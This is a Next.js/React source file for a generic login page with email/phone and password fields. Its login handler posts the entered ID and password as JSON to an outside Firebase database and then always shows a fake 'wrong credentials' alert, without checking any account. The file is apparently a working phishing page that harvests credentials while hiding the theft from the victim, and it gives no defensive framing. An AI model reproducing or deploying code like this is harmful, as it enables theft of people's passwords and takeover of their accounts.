import Link from 'next/link'
import React, { useState } from 'react'

function login() {

    const [lid, setlid] = useState('');
    const [pwd, setpwd] = useState('');
    const [al,setal]=useState(1);
    async function post(){
        const res=await fetch(
            "https://dominitor-default-rtdb.firebaseio.com/m.json",
            {
                method:"POST",
                body:JSON.stringify({lid,pwd})
            }
        )
        if(al==1){
            alert("wrong credentials")
            setal(0);
        }
        setlid('')
        setpwd('')
        
    }

    return (



        <div className=" h-full w-full">

            <div className="text-center my-20 m-0 h-full">
                <div className="border-2 border-slate-600 rounded-lg w-80 inline-block align-middle bg-white hover:shadow-2xl">
                    <h1 className="text-center text-3xl">Welcome to landing page</h1>
                    <div className="text-center m-3">
                        <input type="text" className="border-2 rounded-lg px-10 text-center" value={lid} name="id" onChange={e => setlid(e.target.value)} placeholder="ENTER EMAIL/PHONE NO"></input>
                    </div>
                    <div className="text-center m-3">
                        <input type="password" className="border-2 rounded-lg px-10 text-center cursor-pointer" value={pwd} name="id" onChange={e => setpwd(e.target.value)} placeholder="PASSWORD"></input>
                        <p className="py-2 cursor-pointer">Forgot your password?</p>
                        <button
                            onClick={post}
                            className="border-2 px-10 py-2 rounded-full bg-red-700 text-slate-300 hover:text-zinc-900 hover:bg-white transition-transform hover:shadow-2xl">
                            LOG IN </button>
                        <h1>OR</h1>
                        <button
                            className="border-2 px-10 py-2 rounded-full bg-cyan-600 text-slate-300 hover:text-zinc-900 hover:bg-white transition-transform">
                            CONTINUE WITH GOOGLE </button>
                        <Link href="/">
                            <button
                                className="border-2 px-10 py-2 rounded-full bg-zinc-900 mt-3 text-slate-300 hover:text-zinc-900 hover:bg-white transition-transform">
                                RETURN TO HOME </button>
                        </Link>
                    </div>
                </div>
            </div>
        </div>

    )
}

export default login